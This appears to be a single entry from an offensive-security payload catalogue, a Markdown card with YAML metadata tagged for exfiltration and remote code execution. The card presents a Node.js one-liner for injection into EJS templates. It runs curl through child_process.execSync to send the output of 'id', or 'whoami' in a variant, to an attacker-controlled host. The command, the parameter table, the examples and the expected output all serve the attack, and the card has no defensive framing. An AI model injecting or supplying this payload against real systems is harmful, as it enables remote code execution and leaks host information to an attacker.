---
data: 'require("child_process").execSync("curl http://attacker:8080/`id`")'
tags:
  - exfiltration
  - rce
type: command
output: null
executor: javascript
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.745Z'
id: 14b309a0-6626-4671-a8d8-8abeddcebcde
verified: false
validated: true
submitted: true
---
# js-execsync-curl-exfil

## Command

```javascript
require("child_process").execSync("curl http://attacker:8080/`id`")
```

## Description

EJS-injected Node.js code to execute a curl command that sends the output of 'id' to an attacker-controlled server, enabling data exfiltration via RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| "curl http://attacker:8080/`id`" | Command with backticks for command substitution | Yes |

## Examples

### Basic Usage

```javascript
require("child_process").execSync("curl http://attacker:8080/`id`")
```

### Advanced Usage

```javascript
require("child_process").execSync("curl http://attacker:8080/`whoami`")
```

## Expected Output

Command output sent to attacker-controlled server; no visible response in template unless captured.

## Related

- [[Related Procedure: Launch-and-Exploit-Fastify-Server-for-RCE]]
